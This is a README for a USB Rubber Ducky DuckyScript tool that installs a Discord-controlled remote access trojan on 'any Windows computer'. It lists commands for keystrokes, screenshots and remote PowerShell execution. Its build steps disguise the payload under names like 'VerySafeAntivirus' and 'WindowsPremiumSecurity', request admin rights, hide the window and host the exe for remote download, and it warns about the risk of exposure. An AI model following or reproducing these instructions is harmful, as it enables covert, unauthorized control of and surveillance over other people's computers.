# 3XAYRemoteAccess
**Author**: Ayan Bindal (@3XAY) <br>
**Version**: 1.0 <br>
**Language**: DuckyScript 1.0

## Overview
My remote access script can be loaded onto a USB Rubber Ducky or a similar device to gain remote access to any Windows computer. The script itself is very short and will execute quickly, allowing you to remove it within a few seconds. The rest of the script will run without the USB Rubber Ducky to finish the installation. You can then control the computer via Discord. A small amount of setup is required the first time you use this tool, check the [Installation](#Installation) section for more information.
The script takes ~40 seconds to execute (for just the rubber ducky part)

## Commands
* `.type <input>` - Types the input message on the client
* `.mouse <x> <y>` - Moves the mouse on the client, values separated by 1 space
* `.left` - Sends a left mouse click command to the client
* `.right` - Sends a right mouse click command to the server
* `.screen` - Sends a screenshot of the client screen
* `.cmd <input>` - Runs the given command in Windows Powershell
* `.url <input>` - Opens the given URL on the client
* `.win` - Presses the Windows key on the client
* `.enter` - Presses the enter key on the client
* `.shutdown` - Shuts the client's computer down, it will show a confirmation pop-up and the bot will also be shutdown before you can allow the shutdown, **HIGH RISK OF EXPOSURE**
* `.k` - Instantly kills the bot but leaves the client's computer on

## Installation
1. Follow the steps [here](https://youtu.be/-H4yoyXlrEQ?si=jpTu1eZHZhg_42M7) to make your Discord bot, you can even make 1 per client (multiple clients are not supported for one bot)
2. Open the "VerySafeAntivirus.py" file and put your token and ID in (near line 29-30)
3. Install auto-py-to-exe `pip install auto-py-to-exe` and build the exe, make sure to check the following settings:
	- One file
	- Window Based
	- Advanced > --name = WindowsPremiumSecurity
	- Advanced > --clean = Enable
	- Advanced > Windows specific options > --uac-admin = Enable
4. Upload this file somewhere the script can download it
5. Modify script.txt and replace the GitHub URL (under "Download install script") with the download URL for YOUR exe file
6. You're done! Just load up the script.txt on your USB Rubber Ducky and have fun!

## Case
The case prints in 2 parts, the top and bottom. Print them out and then glue them together around the USB rubber ducky.
Removal: To remove the case, break the 3D print (yeah I couldn't think of any other mounting mechanism that's compact + doesn't require screw holes in the PCB)